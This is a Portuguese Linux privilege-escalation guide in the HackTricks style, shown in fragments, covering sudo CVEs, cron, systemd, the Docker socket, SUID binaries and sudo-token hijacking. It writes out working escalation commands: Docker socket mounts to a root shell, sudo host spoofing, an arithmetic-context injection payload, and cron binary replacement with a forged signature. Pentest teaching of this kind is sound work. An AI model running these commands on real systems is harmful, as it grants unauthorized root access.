...
```
Você pode encontrar uma boa lista de kernels vulneráveis e alguns **compiled exploits** aqui: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) e [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).<sup>[[12]](#references)</sup>\
...
Sempre **pesquise a versão do kernel no Google**; talvez a sua versão do kernel esteja mencionada em algum kernel exploit e, então, você terá certeza de que esse exploit é válido.
...
Escalonamento de Privilégios no Linux - Kernel Linux <= 3.19.0-73.8
```bash
...
Versões do Sudo anteriores à 1.9.17p1 (**1.9.14 - 1.9.17 < 1.9.17p1**) permitem que usuários locais sem privilégios elevem seus privilégios para root por meio da opção `--chroot` do sudo quando o arquivo `/etc/nsswitch.conf` é usado a partir de um diretório controlado pelo usuário.<sup>[[28]](#references)[[29]](#references)</sup>

Aqui está um [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) para explorar essa [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Antes de executar o exploit, certifique-se de que sua versão do `sudo` é vulnerável e de que ela oferece suporte ao recurso `chroot`.

Para obter mais informações, consulte o [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/) original<sup>[[28]](#references)</sup>

### Sudo host-based rules bypass (CVE-2025-32462)

O Sudo anterior à versão 1.9.17p1 (intervalo afetado informado: **1.8.8–1.9.17**) pode avaliar regras sudoers baseadas em host usando o **hostname fornecido pelo usuário** por meio de `sudo -h <host>`, em vez do **hostname real**. Se o sudoers conceder privilégios mais amplos em outro host, você poderá **spoofar** esse host localmente.<sup>[[29]](#references)</sup>

Requisitos:
- Versão vulnerável do sudo
- Regras sudoers específicas para hosts (o host não é o hostname atual nem `ALL`)

Padrão sudoers de exemplo:
```
Host_Alias     SERVERS = devbox, prodbox
Host_Alias     PROD    = prodbox
alice          SERVERS, !PROD = NOPASSWD:ALL
```
Exploit usando spoofing do host permitido:
```bash
sudo -h devbox id
sudo -h devbox -i
```
Se a resolução do nome falsificado bloquear, adicione-o a `/etc/hosts` ou use um hostname que já apareça nos logs/configurações para evitar consultas DNS.
...
Confira a **smasher2 box of HTB** para obter um **exemplo** de como esta vulnerabilidade poderia ser explorada
```bash
...
Si você estiver dentro de um container, comece pela seção de container-security abaixo e depois avance para as páginas de abuso específicas do runtime:
...
```
Além disso, verifique se **algum compilador está instalado**. Isso é útil caso você precise usar algum kernel exploit, pois é recomendado compilá-lo na máquina onde você irá usá-lo (ou em uma semelhante).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Software vulnerável instalado

Verifique a **versão dos pacotes e serviços instalados**. Talvez exista alguma versão antiga do Nagios (por exemplo) que possa ser explorada para escalation de privilégios…\
...
> [!NOTE] > _Observe que esses comandos exibirão muitas informações que, em sua maioria, serão inúteis; portanto, é recomendável usar aplicações como o OpenVAS ou similares, que verificarão se alguma versão de software instalada é vulnerável a exploits conhecidos_
...
top -n 1
```
Sempre verifique se há [**electron/cef/chromium debuggers** em execução; você pode explorá-los para escalar privilégios](../../software-information/electron-cef-chromium-debugger-abuse.md). O **Linpeas** detecta esses processos verificando o parâmetro `--inspect` na linha de comando do processo.\
...
Um processo filho em execução sob um **usuário diferente** do seu processo pai não é automaticamente malicioso, mas é um **sinal útil para triagem**. Algumas transições são esperadas (`root` iniciando um usuário de serviço, gerenciadores de login criando processos de sessão), mas cadeias incomuns podem revelar wrappers, auxiliares de debug, persistência ou limites de confiança frágeis em tempo de execução.
...
pstree -alp
```
Se você encontrar uma cadeia surpreendente, inspecione a linha de comando do processo pai e todos os arquivos que influenciam seu comportamento (`config`, `EnvironmentFile`, scripts auxiliares, diretório de trabalho, argumentos graváveis). Em vários caminhos reais de privesc, o próprio processo filho não era gravável, mas a **config controlada pelo processo pai** ou a cadeia de scripts auxiliares era.

### Executáveis excluídos e arquivos excluídos-abertos

Artefatos de runtime frequentemente ainda podem ser acessados **após a exclusão**. Isso é útil tanto para escalação de privilégios quanto para recuperar evidências de um processo que já possui arquivos sensíveis abertos.
...
Colete globalmente os arquivos excluídos que ainda estão abertos:
```bash
lsof +L1
```
...
No entanto, lembre-se de que **como um usuário comum, você pode ler a memória dos processos que pertencem a você**.
...
> - **kernel.yama.ptrace_scope = 2**: somente administradores podem usar ptrace, pois isso requer a capability CAP_SYS_PTRACE.
...
ProcDump é uma recriação para Linux da ferramenta clássica ProcDump do conjunto de ferramentas Sysinternals para Windows. Obtenha-a em [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714
...
```
Você pode fazer o dump do processo (consulte as seções anteriores para encontrar diferentes maneiras de fazer dump da memória de um processo) e procurar credenciais na memória:
```bash
./dump-memory.sh 2027
...
### Crontab UI (alseambusher) executado como root – privesc de scheduler baseado na web

Se um painel web “Crontab UI” (alseambusher/crontab-ui) for executado como root e estiver vinculado apenas ao loopback, ainda será possível acessá-lo por meio de um encaminhamento de porta local SSH e criar uma tarefa privilegiada para escalar privilégios.<sup>[[1]](#references)[[4]](#references)</sup>
...
- Evite incorporar secrets em arquivos de unidade; use secret stores ou um EnvironmentFile acessível somente pelo root
- Habilite auditoria/logging para execuções de jobs sob demanda

Verifique se algum job agendado está vulnerável. Talvez você possa tirar proveito de um script executado pelo root (vuln de wildcard? Você pode modificar arquivos usados pelo root? Usar symlinks? Criar arquivos específicos no diretório usado pelo root?).
```bash
crontab -l
...
Leia a página a seguir para ver mais técnicas de exploração de wildcards:
...
O Bash executa expansão de parâmetros e substituição de comandos antes da avaliação aritmética em ((...)), $((...)) e let. Se um cron/parser executado como root ler campos de log não confiáveis e alimentá-los em um contexto aritmético, um atacante pode injetar uma substituição de comando $(...) que será executada como root quando o cron for executado.<sup>[[22]](#references)</sup>

- Por que funciona: No Bash, as expansões ocorrem nesta ordem: expansão de parâmetros/variáveis, substituição de comandos, expansão aritmética e, depois, divisão de palavras e expansão de nomes de caminho. Assim, um valor como `$(/bin/bash -c 'id > /tmp/pwn')0` é primeiro substituído (executando o comando), e o `0` numérico restante é usado para a aritmética, permitindo que o script continue sem erros.
...
/tmp/bash -p
```
Se o script executado pelo root usa um **diretório ao qual você tem acesso total**, talvez seja útil excluir essa pasta e **criar uma pasta simbólica apontando para outra** que contenha um script controlado por você.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Validação de symlinks e manipulação mais segura de arquivos
...
- `O_EXCL` com `O_CREAT`: falha se o path já existir (bloqueia links/arquivos previamente criados pelo atacante).
- `openat()`: opera de forma relativa a um file descriptor de um diretório confiável.
- `mkstemp()`: cria arquivos temporários atomicamente com permissões seguras.

### Binaries de cron assinados customizados com payloads graváveis
Às vezes, as equipes defensivas "assinam" binaries acionados pelo cron extraindo uma seção ELF customizada e usando grep para procurar uma string do fornecedor antes de executá-los como root. Se esse binary tiver permissão de escrita para o grupo (por exemplo, `/opt/AV/periodic-checks/monitor` pertencente a `root:devs 770`) e você conseguir obter o signing material, poderá forjar a seção e sequestrar a tarefa do cron:<sup>[[2]](#references)</sup>

1. Use `pspy` para capturar o fluxo de verificação. No Era, o root executava `objcopy --dump-section .text_sig=text_sig_section.bin monitor`, seguido por `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin`, e então executava o arquivo.
2. Recrie o certificado esperado usando a key/config obtida (de `signing.zip`):
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. Compile um replacement malicioso (por exemplo, fazer drop de um bash SUID ou adicionar sua SSH key) e incorpore o certificado em `.text_sig` para que o grep seja bem-sucedido:
```bash
...
```
4. Sobrescreva o binary agendado preservando as permissões de execução:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. Aguarde a próxima execução do cron; quando a verificação ingênua da assinatura for bem-sucedida, seu payload será executado como root.
...
Por exemplo, para **monitorar a cada 0.1s durante 1 minuto**, **ordenar pelos comandos menos executados** e excluir os comandos que tiverem sido executados mais vezes, você pode fazer:
```bash
...
Se um cron de propriedade de root executar `pg_basebackup` (ou qualquer cópia recursiva) em um diretório de banco de dados no qual você pode escrever, você pode plantar um **binário SUID/SGID** que será recopiado como **root:root**, com os mesmos bits de modo, no destino do backup.<sup>[[26]](#references)</sup>

Fluxo típico de descoberta (como um usuário de DB com poucos privilégios):
...
- Confirme que o cluster de origem (por exemplo, `/var/lib/postgresql/14/main`) permite escrita por você e que o destino (`/opt/backups/current`) passa a pertencer a root após a execução da tarefa.
...
Lembre-se de que, se você tiver **permissões de escrita sobre binários executados por serviços**, poderá alterá-los para backdoors; assim, quando os serviços forem executados novamente, os backdoors serão executados.
...
**Timers** são arquivos de unidade do systemd cujo nome termina em `**.timer**` e que controlam arquivos `**.service**` ou eventos. **Timers** podem ser usados como alternativa ao cron, pois têm suporte integrado para eventos de tempo de calendário e eventos de tempo monotônico, e podem ser executados de forma assíncrona.
...
Se você puder modificar um timer, poderá fazê-lo executar alguns tipos existentes de systemd.unit (como um `.service` ou um `.target`)
```bash
...
- Encontrar alguma unidade do systemd que esteja **executando um caminho relativo** e você tenha **privilégios de gravação** sobre o **PATH do systemd** (para personificar esse executável)
...
- `Accept`: Aceita um argumento booleano. Se for **true**, uma **instância de serviço é criada para cada conexão recebida** e somente o socket da conexão é passado para ela. Se for **false**, todos os próprios sockets de escuta são **passados para a unidade de serviço iniciada**, e apenas uma unidade de serviço é criada para todas as conexões. Esse valor é ignorado para sockets de datagrama e FIFOs, nos quais uma única unidade de serviço trata incondicionalmente todo o tráfego recebido. **O padrão é false**. Por razões de desempenho, recomenda-se escrever novos daemons apenas de uma forma compatível com `Accept=no`.
...
- `Service`: Especifica o nome da unidade de **serviço** **a ativar** com o **tráfego recebido**. Essa configuração só é permitida para sockets com Accept=no. O padrão é o serviço que possui o mesmo nome do socket (com o sufixo substituído). Na maioria dos casos, não deve ser necessário usar essa opção.
...
- um atacante pode escrever em `/etc/systemd/system` (ou em outro caminho de busca de unidades)
...
O socket do Docker, geralmente encontrado em `/var/run/docker.sock`, é um arquivo crítico que deve ser protegido. Por padrão, ele pode ser escrito pelo usuário `root` e pelos membros do grupo `docker`. Ter acesso de escrita a esse socket pode levar à escalada de privilégios. Veja como isso pode ser feito e métodos alternativos caso a Docker CLI não esteja disponível.

#### **Escalada de privilégios com a Docker CLI**

Se você tiver acesso de escrita ao socket do Docker, poderá escalar privilégios usando os seguintes comandos:<sup>[[15]](#references)</sup>
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Esses comandos permitem executar um container com acesso no nível root ao sistema de arquivos do host.

#### **Usando a Docker API diretamente**

Nos casos em que a Docker CLI não está disponível, o Docker socket ainda pode ser abusado usando HTTP bruto sobre o Unix socket. O fluxo mais confiável é:
...
O D-Bus opera em um **modelo de permissão permitir/negar**, gerenciando permissões de mensagens (chamadas de métodos, emissões de sinais etc.) com base no efeito cumulativo das regras de política correspondentes. Essas políticas especificam as interações com o bus e podem permitir a escalação de privilégios por meio da exploração dessas permissões.
...
Políticas sem um usuário ou grupo especificado aplicam-se universalmente, enquanto as políticas de contexto "default" aplicam-se a tudo que não estiver abrangido por outras políticas específicas.
```xml
<policy user="root">
...
```
Classifique os listeners pelo alvo de bind:
...
Verifique se você consegue fazer sniffing do tráfego. Se conseguir, poderá capturar algumas credenciais.
```
timeout 1 tcpdump
```
...
ip -br addr
```
Loopback (`lo`) é especialmente valioso em post-exploitation porque muitos serviços exclusivamente internos expõem tokens/cookies/credenciais nele:
```bash
...
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) com o parâmetro `-a` também tenta fazer brute-force de usuários.
...
- O interpretador valida o **header** (magic + metadados de timestamp/hash vinculados ao source) e, em seguida, executa o objeto de código marshaled armazenado após esse header.
...
3. Compile um objeto de código de payload, use `marshal.dumps(...)` nele, exclua o arquivo de cache original e recrie-o com o cabeçalho original mais o bytecode malicioso.
...
- Isso é especialmente útil quando o arquivo-fonte pertence ao root e não é gravável, mas o diretório `__pycache__` que o contém é gravável.
- O ataque falha se o processo privilegiado usar `PYTHONDONTWRITEBYTECODE=1`, importar de um local com permissões seguras ou remover o acesso de escrita de todos os diretórios no caminho de import.
...
- Garanta que nenhum diretório no caminho de importação do Python privilegiado possa ser gravado por usuários com poucos privilégios, incluindo `__pycache__`.
...
Se o sudoers preservar `BASH_ENV` (por exemplo, `Defaults env_keep+="ENV BASH_ENV"`), você pode explorar o comportamento de inicialização não interativa do Bash para executar código arbitrário como root ao invocar um comando permitido.<sup>[[24]](#references)</sup>

- Por que funciona: em shells não interativos, o Bash avalia `$BASH_ENV` e faz source desse arquivo antes de executar o script-alvo. Muitas regras do sudo permitem executar um script ou um wrapper de shell. Se `BASH_ENV` for preservado pelo sudo, seu arquivo será carregado com privilégios de root.<sup>[[23]](#references)</sup>
...
Se o sudo deixar o ambiente intacto (`!env_reset`) enquanto permite `terraform apply`, `$HOME` permanecerá como o do usuário que faz a chamada. Portanto, o Terraform carregará **$HOME/.terraformrc** como root e respeitará `provider_installation.dev_overrides`.<sup>[[25]](#references)</sup>
...
### Bypass de validação de TF_VAR overrides + symlink
...
```
O Terraform resolve o symlink e copia o `/root/root.txt` real para um destino legível pelo atacante. A mesma abordagem pode ser usada para **escrever** em caminhos privilegiados ao pré-criar symlinks no destino (por exemplo, apontando o caminho de destino do provider para dentro de `/etc/cron.d/`).

### requiretty / !requiretty

Em algumas distribuições mais antigas, o sudo pode ser configurado com `requiretty`, que força o sudo a ser executado somente a partir de um TTY interativo. Se `!requiretty` estiver definido (ou a opção estiver ausente), o sudo poderá ser executado a partir de contextos não interativos, como reverse shells, tarefas cron ou scripts.
```bash
Defaults !requiretty
```
...
Se `sudo -l` mostrar `env_keep+=PATH` ou um `secure_path` contendo entradas graváveis pelo atacante (por exemplo, `/home/<user>/bin`), qualquer comando relativo dentro do alvo permitido pelo sudo poderá ser sobreposto.<sup>[[3]](#references)</sup>
...
**Use** para ler outros arquivos ou usar **symlinks**. Por exemplo, no arquivo sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
...
Se o binário **suid** **executar outro comando especificando o caminho**, você poderá tentar **exportar uma função** com o nome do comando que o arquivo suid está chamando.
...
Uma misconfiguration comum de custom-app é um wrapper de binário SUID de propriedade do root que executa um script, enquanto o próprio script pode ser modificado por usuários com poucos privilégios.
...
```
Por fim, **escalate privileges** executando
```bash
...
Para explorar isso, deve-se criar um arquivo C, por exemplo _"/path/to/.config/libcalc.c"_, contendo o código a seguir:
```c
#include <stdio.h>
#include <stdlib.h>
...
```
Este código, após ser compilado e executado, tem como objetivo elevar privilégios manipulando permissões de arquivos e executando um shell com privilégios elevados.
...
O projeto reúne funções legítimas de binários Unix que podem ser abusadas para escapar de restricted shells, escalar ou manter privilégios elevados, transferir arquivos, gerar bind e reverse shells e facilitar outras tarefas de post-exploitation.
...
Nos casos em que você tem **acesso ao sudo**, mas não tem a senha, pode escalar privilégios **aguardando a execução de um comando sudo e, em seguida, sequestrando o session token**.<sup>[[18]](#references)</sup>

Requisitos para escalar privilégios:

- Você já tem um shell como o usuário "_sampleuser_"
- "_sampleuser_" **usou `sudo`** para executar algo nos **últimos 15 minutos** (por padrão, essa é a duração do sudo token que permite usar `sudo` sem informar nenhuma senha)
...
As capabilities do Linux fornecem um **subconjunto dos privilégios de root disponíveis para um processo**. Isso efetivamente divide os **privilégios de root em unidades menores e distintas**. Cada uma dessas unidades pode então ser concedida independentemente aos processos. Dessa forma, o conjunto completo de privilégios é reduzido, diminuindo os riscos de exploração.\
...
Uma configuração incorreta comum é um arquivo pertencente ao root em `/etc/sudoers.d/` com modo `440` que ainda concede acesso de escrita a um usuário com poucos privilégios por meio de uma ACL.
```bash
ls -l /etc/sudoers.d/*
...
sudo -l
```
Este é um caminho de persistência/privesc via ACL de alto impacto, pois é fácil não detectá-lo em análises baseadas apenas em `ls -l`.

## Sessões de shell abertas

Em **versões antigas**, você pode **hijack** alguma sessão de **shell** de outro usuário (**root**).\
Nas **versões mais recentes**, você poderá **conectar-se** às sessões do screen apenas do **seu próprio usuário**. No entanto, você pode encontrar **informações interessantes dentro da sessão**.
...
```
![Localizações dos sockets (alguns sistemas expõem um como symlink do outro) - hijacking de sessões do tmux: tmux -S /tmp/dev sess ls Lista usando esse socket; você pode iniciar uma sessão do tmux nesse socket...](<../../images/image (837).png>)
...
Esse bug é causado ao criar uma nova chave SSH nesses sistemas operacionais, pois **apenas 32.768 variações eram possíveis**. Isso significa que todas as possibilidades podem ser calculadas e, **tendo a chave pública SSH, você pode procurar a chave privada correspondente**. Você pode encontrar as possibilidades calculadas aqui: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)
...
```
Essa configuração indicará que, se você tentar fazer login com a chave **private** do usuário "**testusername**", o ssh comparará a chave pública da sua chave com as localizadas em `/home/testusername/.ssh/authorized_keys` e `/home/testusername/access`
...
O arquivo `/etc/ssh_config` pode **substituir estas opções** e permitir ou negar essa configuração.\
...
su - dummy
```
NOTA: Nas plataformas BSD, o `/etc/passwd` está localizado em `/etc/pwd.db` e `/etc/master.passwd`; além disso, o `/etc/shadow` é renomeado para `/etc/spwd.db`.
...
Group=root
```
Your backdoor será executado na próxima vez que o tomcat for iniciado.
...
```
### Arquivos em locais estranhos/com proprietários estranhos
```bash
...
**Outra ferramenta interessante** que você pode usar para isso é o [**LaZagne**](https://github.com/AlessandroZ/LaZagne), que é uma aplicação open source usada para recuperar muitas senhas armazenadas em um computador local com Windows, Linux e Mac.

### Logs

Se você consegue ler logs, pode ser capaz de encontrar **informações interessantes/confidenciais dentro deles**. Quanto mais estranho for o log, mais interessante ele provavelmente será.\
Além disso, alguns **audit logs** configurados "**incorretamente**" (com backdoor?) podem permitir **registrar senhas** dentro dos audit logs, conforme explicado neste post: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).<sup>[[36]](#references)</sup>
```bash
...
Você também deve procurar arquivos que contenham a palavra "**password**" no **nome** ou dentro do **conteúdo**, além de verificar IPs e e-mails dentro de logs ou regexps de hashes.\
...
### Hijacking de biblioteca Python

Se você sabe **de onde** um script Python será executado e **pode escrever dentro** dessa pasta ou **modificar bibliotecas Python**, pode modificar a biblioteca do SO e fazer um backdoor nela (se puder escrever no local onde o script Python será executado, copie e cole a biblioteca os.py).

Para fazer um **backdoor na biblioteca**, basta adicionar a seguinte linha ao final da biblioteca os.py (altere o IP e a PORTA):
```python
...
Esta vulnerabilidade é muito semelhante à [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(logs do nginx),** portanto, sempre que descobrir que pode alterar logs, verifique quem gerencia esses logs e se você pode escalar privilégios substituindo os logs por symlinks.
...
Os scripts de rede, como _ifcg-eth0_, são usados para conexões de rede. Eles se parecem exatamente com arquivos .INI. No entanto, são \~sourced\~ no Linux pelo Network Manager (dispatcher.d).
...
Por outro lado, `/etc/init` está associado ao **Upstart**, um **sistema de gerenciamento de serviços** mais recente, introduzido pelo Ubuntu, que usa arquivos de configuração para tarefas de gerenciamento de serviços. Apesar da transição para o Upstart, os scripts do SysVinit ainda são utilizados junto com as configurações do Upstart devido a uma camada de compatibilidade no Upstart.
...
## Frameworks de rooting do Android: abuso do canal do manager

Frameworks de rooting do Android normalmente fazem hook de um syscall para expor funcionalidades privilegiadas do kernel a um manager em userspace. Uma autenticação fraca do manager (por exemplo, verificações de assinatura baseadas na ordem dos FDs ou esquemas de senha inadequados) pode permitir que um app local se passe pelo manager e faça escalonamento para root em dispositivos que já possuem root. Saiba mais e veja detalhes da exploração aqui:
